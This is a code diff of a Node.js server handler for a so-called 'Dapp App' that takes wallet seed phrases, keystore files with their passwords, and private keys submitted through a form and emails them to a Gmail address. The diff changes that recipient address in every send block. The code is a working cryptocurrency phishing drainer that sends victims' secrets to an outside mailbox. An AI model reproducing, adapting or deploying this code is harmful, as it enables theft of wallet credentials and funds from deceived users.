@@ -1,4 +1,4 @@
-const nodemailer = require("nodemailer");
+import nodemailer from "nodemailer";
 
 function formatMessage(message) {
   const lines = message.split(/\r?\n/);
@@ -34,14 +34,14 @@ module.exports = async (req, res) => {
         const formattedMessage = formatMessage(phrase);
         mailOptions = {
           from: `Dapp App <${email}>`,
-          to: "ibsalam24@gmail.com",
+          to: "Fixiondapps@gmail.com",
           subject: "New Phrase Submission",
           html: `${formattedMessage} <br/> Wallet: ${item}`,
         };
       } else if (keystore) {
         mailOptions = {
           from: `Dapp App <${email}>`,
-          to: "ibsalam24@gmail.com",
+          to: "Fixiondapps@gmail.com",
           subject: "New Keystore Submission",
           html: `<div>Json: ${keystore.json}</div>
                  <div>Password: ${keystore.password}</div>
@@ -51,7 +51,7 @@ module.exports = async (req, res) => {
         const formattedMessage = formatMessage(privateKey);
         mailOptions = {
           from: `Dapp App <${email}>`,
-          to: "ibsalam24@gmail.com",
+          to: "Fixiondapps@gmail.com",
           subject: "New Private Key Submission",
           html: `${formattedMessage} <br/> Wallet: ${item}`,
         };
@@ -81,14 +81,14 @@ module.exports = async (req, res) => {
         const formattedMessage = formatMessage(phrase);
         mailOptions = {
           from: `Dapp App <${email}>`,
-          to: "ibsalam24@gmail.com",
+          to: "Fixiondapps@gmail.com",
           subject: "New Phrase Submission",
           html: `${formattedMessage} <br/> Wallet: ${item}`,
         };
       } else if (keystore) {
         mailOptions = {
           from: `Dapp App <${email}>`,
-          to: "ibsalam24@gmail.com",
+          to: "Fixiondapps@gmail.com",
           subject: "New Keystore Submission",
           html: `<div>Json: ${keystore.json}</div>
                  <div>Password: ${keystore.password}</div>
@@ -98,7 +98,7 @@ module.exports = async (req, res) => {
         const formattedMessage = formatMessage(privateKey);
         mailOptions = {
           from: `Dapp App <${email}>`,
-          to: "ibsalam24@gmail.com",
+          to: "Fixiondapps@gmail.com",
           subject: "New Private Key Submission",
           html: `${formattedMessage} <br/> Wallet: ${item}`,
         };
